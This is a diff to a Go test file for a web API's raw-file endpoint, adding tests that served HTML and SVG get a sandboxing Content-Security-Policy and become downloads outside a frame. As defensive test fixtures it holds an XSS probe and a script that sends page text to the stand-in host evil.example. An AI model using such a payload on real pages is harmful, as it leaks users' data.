@@ -6,6 +6,7 @@ import (
 	"errors"
 	"log/slog"
 	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
 	"time"
@@ -200,7 +201,7 @@ func TestFilesReportsTruncatedFolder(t *testing.T) {
 func TestRawServesHTMLSandboxed(t *testing.T) {
 	t.Parallel()
 	l := &apitest.StubFilesLister{Content: "<script>alert(1)</script>"}
-	rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path=jobs/nightly/r1/output.html")
+	rec := getRaw(t, l, "jobs/nightly/r1/output.html", "iframe")
 	if rec.Code != http.StatusOK {
 		t.Fatalf("got %d %s", rec.Code, rec.Body)
 	}
@@ -231,12 +232,67 @@ func TestRawServesHTMLSandboxed(t *testing.T) {
 func TestRawHTMLAndSVGCannotReachTheNetwork(t *testing.T) {
 	t.Parallel()
 	for _, file := range []string{"report.html", "chart.svg"} {
-		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Content: "x"}, false, http.MethodGet, "/api/files/raw?path="+file)
+		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, file, "iframe")
 		csp := rec.Header().Get("Content-Security-Policy")
 		for _, want := range []string{"sandbox allow-scripts", "default-src 'none'", "connect-src 'none'", "form-action 'none'", "frame-ancestors 'self'"} {
 			if !strings.Contains(csp, want) {
 				t.Errorf("%s: CSP %q lacks %q", file, csp, want)
 			}
+		}
+		// No CSP directive stops a page navigating itself or opening a
+		// window, either of which can carry what the viewer typed away: the
+		// sandbox allows neither popups nor navigating the top window.
+		for _, bad := range []string{"allow-popups", "allow-top-navigation", "allow-modals", "allow-forms", "allow-same-origin"} {
+			if strings.Contains(csp, bad) {
+				t.Errorf("%s: CSP %q allows %q", file, csp, bad)
+			}
+		}
+	}
+}
+
+// getRaw reads file of alice's home as the browser does for a load of kind
+// dest (Sec-Fetch-Dest; "" sends none).
+func getRaw(t *testing.T, l *apitest.StubFilesLister, file, dest string) *httptest.ResponseRecorder {
+	t.Helper()
+	f := apitest.New(t, apitest.Options{Files: l})
+	r := httptest.NewRequest(http.MethodGet, "/api/files/raw?path="+file, nil)
+	r.Header.Set("Sec-Fetch-Site", "same-origin")
+	if dest != "" {
+		r.Header.Set("Sec-Fetch-Dest", dest)
+	}
+	r.AddCookie(f.Session("alice"))
+	w := httptest.NewRecorder()
+	f.Srv.ServeHTTP(w, r)
+	return w
+}
+
+// A page or picture that runs script shows only in a frame of the web UI's
+// file viewer, whose own policy keeps the frame from navigating anywhere
+// but to a raw file: opened as a tab of its own (or with no Sec-Fetch-Dest)
+// it could navigate itself to another site with what the viewer typed, so
+// it is a download there. An SVG in an img runs no script and shows.
+func TestRawActiveDocumentsShowOnlyInAFrame(t *testing.T) {
+	t.Parallel()
+	for _, tc := range []struct {
+		file, dest string
+		inline     bool
+	}{
+		{"report.html", "iframe", true},
+		{"report.html", "document", false},
+		{"report.html", "", false},
+		{"chart.svg", "image", true},
+		{"chart.svg", "iframe", true},
+		{"chart.svg", "document", false},
+		{"chart.svg", "", false},
+		{"chart.png", "document", true},
+	} {
+		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, tc.file, tc.dest)
+		disp := rec.Header().Get("Content-Disposition")
+		if rec.Code != http.StatusOK || (disp == "") != tc.inline {
+			t.Errorf("%s as %q: %d disposition %q, want inline %v", tc.file, tc.dest, rec.Code, disp, tc.inline)
+		}
+		if !tc.inline && (rec.Header().Get("Content-Type") != "application/octet-stream" || !strings.HasPrefix(disp, "attachment")) {
+			t.Errorf("%s as %q: type %q disposition %q", tc.file, tc.dest, rec.Header().Get("Content-Type"), disp)
 		}
 	}
 }
@@ -259,7 +315,7 @@ func cspDirectives(csp string) map[string][]string {
 func TestRawHTMLCannotReachTheNetwork(t *testing.T) {
 	t.Parallel()
 	l := &apitest.StubFilesLister{Content: "<script>fetch('https://evil.example/'+document.body.innerText)</script>"}
-	rec := apitest.GetFiles(t, l, false, http.MethodGet, "/api/files/raw?path=report.html")
+	rec := getRaw(t, l, "report.html", "iframe")
 	d := cspDirectives(rec.Header().Get("Content-Security-Policy"))
 	for _, k := range []string{"default-src", "connect-src", "form-action", "base-uri", "frame-src", "object-src"} {
 		src, ok := d[k]
@@ -307,7 +363,7 @@ func TestRawContentTypesComeFromAnAllowList(t *testing.T) {
 		{"A.HTML", "text/html; charset=utf-8"},
 	}
 	for _, tc := range cases {
-		rec := apitest.GetFiles(t, &apitest.StubFilesLister{Content: "x"}, false, http.MethodGet, "/api/files/raw?path=jobs/"+tc.file)
+		rec := getRaw(t, &apitest.StubFilesLister{Content: "x"}, "jobs/"+tc.file, "iframe")
 		if rec.Code != http.StatusOK || rec.Header().Get("Content-Type") != tc.typ || rec.Header().Get("Content-Disposition") != "" {
 			t.Errorf("%s: %d type %q disposition %q", tc.file, rec.Code, rec.Header().Get("Content-Type"), rec.Header().Get("Content-Disposition"))
 		}
